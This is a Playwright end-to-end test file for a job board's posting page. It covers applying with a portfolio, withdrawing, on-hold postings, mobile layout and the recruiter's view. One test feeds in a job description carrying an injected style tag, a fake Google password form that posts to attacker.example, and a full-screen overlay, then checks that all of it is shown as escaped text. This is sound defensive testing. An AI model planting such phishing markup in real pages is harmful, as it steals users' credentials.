import { expect, test, type APIRequestContext, type Page } from '@playwright/test';
import {
	API_URL,
	JWT_SECRET,
	apiAs,
	blockGoogle,
	gotoHydrated,
	ownerSession,
	recruiterSession,
	signIn,
	toasts,
	type OwnerSession
} from './support/owner';
import { createJob, deleteJobs } from './support/jobs';

// Applying to a job posting from its public page (/jobs/:id). The postings belong to the e2e
// recruiter and are created through the API; the candidate is the owner of 'e2e-applicant' (both
// seeded by `bun run --cwd server seed:e2e`). Each test names its postings with its own tag and
// removes them afterwards (their applications go with them). The recruiter is shared with
// client/tests/recruiter.test.ts, which runs in parallel: never expect its list to be empty.

test.skip(!JWT_SECRET, 'Set JWT_SECRET to the API’s secret to sign in as the e2e users');

const APPLICANT_DOMAIN = 'e2e-applicant';
/** Tags of this file: what an interrupted run left behind is removed before the tests */
const TAG_PREFIX = 'apply';

let recruiter: OwnerSession;
let candidate: OwnerSession;
let api: APIRequestContext;

test.beforeAll(async () => {
	recruiter = await recruiterSession();
	candidate = await ownerSession(APPLICANT_DOMAIN);
	api = await apiAs(recruiter);
	await deleteJobs(api, new RegExp(`\\b${TAG_PREFIX}-\\d+-[0-9a-z]+\\b`));
});

test.afterAll(async () => {
	await api?.dispose();
});

let tag = '';
test.beforeEach(async ({ page }, testInfo) => {
	tag = `${TAG_PREFIX}-${testInfo.workerIndex}-${Date.now().toString(36)}`;
	await blockGoogle(page);
});

test.afterEach(async () => {
	await deleteJobs(api, tag);
});

/** The panel next to the posting, where candidates apply */
const applyPanel = (page: Page) => page.getByRole('complementary', { name: 'Apply' });

test.describe('applying to a job posting', () => {
	test('a candidate applies with their portfolio, the recruiter sees it, the candidate withdraws', async ({
		page,
		browser
	}, testInfo) => {
		const title = `Frontend engineer ${tag}`;
		const job = await createJob(api, { title, status: 'open' });
		await signIn(page, candidate);
		await gotoHydrated(page, `/jobs/${job._id}`);
		await expect(page.getByRole('heading', { level: 2, name: title, exact: true })).toBeVisible();

		const panel = applyPanel(page);
		await expect(panel.getByRole('heading', { name: 'Apply with your portfolio' })).toBeVisible();
		await expect(panel.getByRole('link', { name: APPLICANT_DOMAIN, exact: true })).toHaveAttribute(
			'href',
			`/${APPLICANT_DOMAIN}/experiences`
		);
		await panel.getByRole('button', { name: `Apply with ${APPLICANT_DOMAIN}` }).click();

		await expect(panel.getByRole('heading', { name: 'Application sent' })).toBeVisible();
		await expect(panel.getByText(/^You applied on \d{1,2} [A-Z][a-z]{2} \d{4}\.$/)).toBeVisible();
		await expect(toasts(page).getByText('Application sent', { exact: true })).toBeVisible();
		await expect(toasts(page)).toContainText(
			`The recruiter can now see your portfolio, ${APPLICANT_DOMAIN}.`
		);

		// The recruiter's page of the posting lists the candidate, with their portfolio
		const recruiterContext = await browser.newContext({ baseURL: testInfo.project.use.baseURL });
		try {
			const recruiterPage = await recruiterContext.newPage();
			await blockGoogle(recruiterPage);
			await signIn(recruiterPage, recruiter);
			await gotoHydrated(recruiterPage, `/recruiter/jobs/${job._id}`);
			const applicants = recruiterPage.getByRole('list', { name: 'Applicants' });
			await expect(applicants.getByRole('listitem')).toHaveCount(1);
			await expect(applicants).toContainText('Ada Applicant');
			await expect(applicants).toContainText('Applied');
			await expect(
				applicants.getByRole('link', { name: new RegExp(`^${APPLICANT_DOMAIN}`) })
			).toHaveAttribute('href', `/${APPLICANT_DOMAIN}/experiences`);

			// Withdrawing asks first
			await panel.getByRole('button', { name: 'Withdraw my application' }).click();
			await expect(
				panel.getByText(
					'Withdraw your application? The recruiter will no longer see you as an applicant.'
				)
			).toBeVisible();
			await panel.getByRole('button', { name: 'Withdraw', exact: true }).click();
			await expect(toasts(page).getByText('Application withdrawn', { exact: true })).toBeVisible();
			await expect(panel.getByRole('heading', { name: 'Apply with your portfolio' })).toBeVisible();
			await expect(
				panel.getByRole('button', { name: `Apply with ${APPLICANT_DOMAIN}` })
			).toBeVisible();

			// The recruiter's list is empty again
			await gotoHydrated(recruiterPage, `/recruiter/jobs/${job._id}`);
			await expect(recruiterPage.getByText(/^No applicants yet\./)).toBeVisible();
			await expect(applicants).toHaveCount(0);
		} finally {
			await recruiterContext.close();
		}

		// Withdrawn for good: a reload shows the posting open to an application
		await gotoHydrated(page, `/jobs/${job._id}`);
		await expect(
			applyPanel(page).getByRole('button', { name: `Apply with ${APPLICANT_DOMAIN}` })
		).toBeVisible();
	});

	test('a posting that is not open takes no applications', async ({ page }) => {
		const title = `QA engineer ${tag}`;
		const job = await createJob(api, { title, status: 'on_hold' });
		await signIn(page, candidate);
		await gotoHydrated(page, `/jobs/${job._id}`);

		await expect(page.getByRole('heading', { level: 2, name: title, exact: true })).toBeVisible();
		const panel = applyPanel(page);
		await expect(panel.getByRole('heading', { name: 'On hold' })).toBeVisible();
		await expect(
			panel.getByText('This position is not taking applications for now. Check back later.')
		).toBeVisible();
		await expect(panel.getByRole('button', { name: /^Apply/ })).toHaveCount(0);

		// Public, but not on the job board (open postings only)
		await gotoHydrated(page, '/jobs');
		await expect(page.getByRole('heading', { level: 2, name: 'Open positions' })).toBeVisible();
		await expect(page.getByRole('link', { name: title, exact: true })).toHaveCount(0);
	});

	test('a description shows its raw HTML as text: it cannot restyle the page or add a form', async ({
		page
	}) => {
		const description = [
			'## The job',
			'',
			'Apply below.',
			'<style>aside[aria-label="Apply"]{display:none!important}</style>',
			'<form action="https://attacker.example/collect" method="post"><label>Google password <input name="password" type="password"></label><button>Apply with Google</button></form>',
			'',
			'Inline <span style="position:fixed;inset:0;background:red">cover</span> text.'
		].join('\n');
		const job = await createJob(api, { title: `Sales lead ${tag}`, status: 'open', description });

		// Not in the page rendered on the server either
		const html = await (await page.request.get(`/jobs/${job._id}`)).text();
		expect(html).not.toContain('<form action="https://attacker.example');
		expect(html).not.toContain('<input name="password"');
		expect(html).not.toMatch(/<style>aside/);

		await gotoHydrated(page, `/jobs/${job._id}`);
		await expect(applyPanel(page)).toBeVisible();
		await expect(page.locator('form[action^="https://attacker.example"]')).toHaveCount(0);
		await expect(page.locator('input[type="password"]')).toHaveCount(0);
		await expect(page.getByRole('button', { name: 'Apply with Google' })).toHaveCount(0);
		await expect(
			page.getByText('<form action="https://attacker.example/collect"', { exact: false })
		).toBeVisible();
		// Its headings rank right under "About the job" (h3): an h4, not an h5
		await expect(page.getByRole('heading', { level: 4, name: 'The job' })).toBeVisible();
	});

	test('on a phone, the link next to the title waits for the session, and leads to the panel without moving the header', async ({
		page
	}) => {
		await page.setViewportSize({ width: 390, height: 844 });
		const job = await createJob(api, { title: `Support engineer ${tag}`, status: 'open' });
		await signIn(page, candidate);

		// Rendered on the server: no link yet (it would change once the viewer is known)
		const html = await (await page.request.get(`/jobs/${job._id}`)).text();
		expect(html).not.toContain('href="#apply"');

		await gotoHydrated(page, `/jobs/${job._id}`);
		const link = page.getByRole('link', { name: 'Apply', exact: true });
		await expect(link).toBeVisible();
		await link.click();
		await expect(
			applyPanel(page).getByRole('heading', { name: 'Apply with your portfolio' })
		).toBeInViewport();
		// The page scrolled, not the document: the header stays on screen
		await expect(page.getByRole('banner')).toBeInViewport();
		expect(await page.evaluate(() => document.documentElement.scrollTop)).toBe(0);
		expect(
			await page.evaluate(
				() => document.documentElement.scrollHeight <= document.documentElement.clientHeight
			)
		).toBe(true);
	});

	test("the posting's recruiter is led to manage it, never offered to apply", async ({ page }) => {
		await page.setViewportSize({ width: 390, height: 844 });
		const job = await createJob(api, { title: `Office manager ${tag}`, status: 'open' });
		// The public posting never names its recruiter
		const publicJob = await (await page.request.get(`${API_URL}/jobs/${job._id}`)).json();
		expect(publicJob).not.toHaveProperty('recruiter');

		await signIn(page, recruiter);
		await gotoHydrated(page, `/jobs/${job._id}`);
		const panel = applyPanel(page);
		await expect(
			panel.getByRole('heading', { name: 'This is your job description' })
		).toBeVisible();
		await expect(page.getByRole('link', { name: 'Manage it' }).first()).toBeVisible();
		await expect(page.getByRole('link', { name: 'Apply', exact: true })).toHaveCount(0);
	});

	test('a visitor who is not signed in is asked to sign in', async ({ page }) => {
		const job = await createJob(api, { title: `Mobile engineer ${tag}`, status: 'open' });
		await gotoHydrated(page, `/jobs/${job._id}`);

		const panel = applyPanel(page);
		await expect(
			panel.getByRole('heading', { name: 'Sign in to apply with your portfolio' })
		).toBeVisible();
		await expect(
			panel.getByText(/No portfolio yet\? You can claim one once signed in\./)
		).toBeVisible();
		await expect(panel.getByRole('button', { name: /^Apply/ })).toHaveCount(0);
	});
});
